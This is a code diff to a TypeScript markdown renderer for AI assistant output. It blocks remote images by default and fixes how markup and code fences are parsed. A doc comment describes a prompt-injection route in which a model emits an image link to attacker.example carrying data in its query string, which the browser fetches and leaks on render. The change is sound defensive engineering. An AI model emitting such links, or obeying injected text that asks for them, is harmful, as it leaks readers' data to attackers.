@@ -39,28 +39,58 @@ function safeUrl(value: string): string | null {
     return null;
 }
 
-/** Applies the span-level rules to one already-escaped line. @internal */
-function renderInline(text: string): string {
-    // Code first: what it holds is literal, so nothing after this may look inside it. Lifting the
-    // spans out is what buys that — a later rule cannot see a span it was never handed.
-    const codeSpans: string[] = [];
+/**
+ * How the prose is rendered.
+ *
+ * @group Interface
+ */
+export interface AssistMarkdownOptions {
+    /**
+     * Whether an image on a remote origin is rendered.
+     *
+     * Off by default, and deliberately. An answer is model output, and a model can be talked into
+     * emitting `![](https://attacker.example/?q=…)` by anything it has read — a page, a document, a
+     * previous message. The browser fetches that URL as soon as the answer renders, which hands the
+     * reader's address and the query string to whoever chose it without a click ever happening.
+     *
+     * Turn it on where the answers are trusted, or where images already pass through a proxy.
+     */
+    allowRemoteImages?: boolean;
+}
 
-    let output = text.replace(/`([^`]+)`/g, (_match, code: string) => {
-        codeSpans.push(code);
+/**
+ * Applies the span-level rules to one already-escaped line.
+ *
+ * Anything this produces — a code span, an image, the `<a …>` that opens a link — is lifted OUT of
+ * the text before the next rule runs and put back at the end. Without that, a later rule reads the
+ * markup the earlier one wrote: `https://host/my_file_latest` inside an `href` has its underscores
+ * turned into `<em>` and the link arrives at the browser malformed.
+ *
+ * A link's visible text is deliberately NOT lifted, because `[**bold**](url)` is meant to work.
+ *
+ * @internal
+ */
+function renderInline(text: string, options: AssistMarkdownOptions): string {
+    const slots: string[] = [];
+    const hold = (html: string) => `${CODE_MARKER}${slots.push(html) - 1}${CODE_MARKER}`;
 
-        return `${CODE_MARKER}${codeSpans.length - 1}${CODE_MARKER}`;
-    });
+    let output = text.replace(/`([^`]+)`/g, (_match, code: string) => hold(`<code>${code}</code>`));
 
     output = output.replace(/!\[([^\]]*)\]\(([^)\s]+)(?:\s+&quot;([^&]*)&quot;)?\)/g, (match, alt: string, url: string, title: string | undefined) => {
         const href = safeUrl(url);
 
-        return href ? `<img src="${href}" alt="${alt}"${title ? ` title="${title}"` : ''} />` : match;
+        // Held rather than returned: left in the text, the link rule below would pick the `[x](url)`
+        // half back up and leave a stray `!` in front of it.
+        if (!href) return hold(match);
+        if (!options.allowRemoteImages && /^https?:/i.test(href)) return hold(match);
+
+        return hold(`<img src="${href}" alt="${alt}"${title ? ` title="${title}"` : ''} />`);
     });
 
     output = output.replace(/\[([^\]]+)\]\(([^)\s]+)(?:\s+&quot;([^&]*)&quot;)?\)/g, (match, label: string, url: string, title: string | undefined) => {
         const href = safeUrl(url);
 
-        return href ? `<a href="${href}" target="_blank" rel="noopener noreferrer"${title ? ` title="${title}"` : ''}>${label}</a>` : match;
+        return href ? `${hold(`<a href="${href}" target="_blank" rel="noopener noreferrer"${title ? ` title="${title}"` : ''}>`)}${label}${hold('</a>')}` : match;
     });
 
     output = output.replace(/(\*\*\*|___)(?=\S)([\s\S]*?\S)\1/g, '<strong><em>$2</em></strong>');
@@ -68,7 +98,7 @@ function renderInline(text: string): string {
     output = output.replace(/(\*|_)(?=\S)([\s\S]*?\S)\1/g, '<em>$2</em>');
     output = output.replace(/~~(?=\S)([\s\S]*?\S)~~/g, '<del>$1</del>');
 
-    return output.replace(new RegExp(`${CODE_MARKER}(\\d+)${CODE_MARKER}`, 'g'), (_match, position: string) => `<code>${codeSpans[Number(position)]}</code>`);
+    return output.replace(new RegExp(`${CODE_MARKER}(\\d+)${CODE_MARKER}`, 'g'), (_match, position: string) => slots[Number(position)]);
 }
 
 /** Splits a table row on its pipes. @internal */
@@ -89,7 +119,7 @@ function tableCells(line: string): string[] {
  *
  * @group Function
  */
-export function renderMarkdown(source: string): string {
+export function renderMarkdown(source: string, options: AssistMarkdownOptions = {}): string {
     if (!source) return '';
 
     const lines = escapeHtml(source).split(/\r?\n/);
@@ -101,7 +131,7 @@ export function renderMarkdown(source: string): string {
     const closeParagraph = () => {
         if (paragraph.length === 0) return;
 
-        output.push(`<p>${renderInline(paragraph.join('<br />'))}</p>`);
+        output.push(`<p>${renderInline(paragraph.join('<br />'), options)}</p>`);
         paragraph = [];
     };
 
@@ -140,7 +170,7 @@ export function renderMarkdown(source: string): string {
 
             const level = heading[1].length;
 
-            output.push(`<h${level}>${renderInline(heading[2].trim())}</h${level}>`);
+            output.push(`<h${level}>${renderInline(heading[2].trim(), options)}</h${level}>`);
             continue;
         }
 
@@ -156,13 +186,13 @@ export function renderMarkdown(source: string): string {
             closeAll();
 
             const alignments = tableCells(lines[index + 1]).map((cell) => (cell.startsWith(':') && cell.endsWith(':') ? 'center' : cell.endsWith(':') ? 'right' : cell.startsWith(':') ? 'left' : ''));
-            const header = tableCells(line).map((cell, position) => `<th${alignments[position] ? ` style="text-align:${alignments[position]}"` : ''}>${renderInline(cell)}</th>`);
+            const header = tableCells(line).map((cell, position) => `<th${alignments[position] ? ` style="text-align:${alignments[position]}"` : ''}>${renderInline(cell, options)}</th>`);
             const body: string[] = [];
 
             index += 2;
 
             while (index < lines.length && lines[index].includes('|') && lines[index].trim()) {
-                const cells = tableCells(lines[index]).map((cell, position) => `<td${alignments[position] ? ` style="text-align:${alignments[position]}"` : ''}>${renderInline(cell)}</td>`);
+                const cells = tableCells(lines[index]).map((cell, position) => `<td${alignments[position] ? ` style="text-align:${alignments[position]}"` : ''}>${renderInline(cell, options)}</td>`);
 
                 body.push(`<tr>${cells.join('')}</tr>`);
                 index += 1;
@@ -184,7 +214,7 @@ export function renderMarkdown(source: string): string {
                 inQuote = true;
             }
 
-            output.push(`<p>${renderInline(quote[1])}</p>`);
+            output.push(`<p>${renderInline(quote[1], options)}</p>`);
             continue;
         }
 
@@ -210,9 +240,9 @@ export function renderMarkdown(source: string): string {
             if (task) {
                 const checked = task[1].toLowerCase() === 'x';
 
-                output.push(`<li><input type="checkbox" disabled${checked ? ' checked' : ''} /> ${renderInline(task[2])}</li>`);
+                output.push(`<li><input type="checkbox" disabled${checked ? ' checked' : ''} /> ${renderInline(task[2], options)}</li>`);
             } else {
-                output.push(`<li>${renderInline(item)}</li>`);
+                output.push(`<li>${renderInline(item, options)}</li>`);
             }
 
             continue;
@@ -246,7 +276,9 @@ export function splitMarkdownBlocks(source: string): AssistResponseBlock[] {
     // The closing fence must be a LINE of its own and the fallback must be the true end of the input.
     // A bare `$` under the `m` flag matches at every line end, which would stop the lazy body at the
     // first newline and report every finished sample as still streaming.
-    const pattern = /^```([^\n`]*)\n([\s\S]*?)(?:\n```[ \t]*$|$(?![\s\S]))/gm;
+    // The closing fence is CAPTURED rather than sniffed off the end of the match: `value = ``` ` on
+    // the same line ends in three backticks too, and a suffix check calls that terminated.
+    const pattern = /^```([^\n`]*)\n([\s\S]*?)(?:\n(```)[ \t]*$|$(?![\s\S]))/gm;
     let cursor = 0;
     let match: RegExpExecArray | null;
 
@@ -259,7 +291,7 @@ export function splitMarkdownBlocks(source: string): AssistResponseBlock[] {
 
         const info = match[1].trim();
         const consumed = match[0];
-        const terminated = /```[ \t]*$/.test(consumed.trimEnd());
+        const terminated = match[3] !== undefined;
 
         blocks.push({
             blockType: 'code',
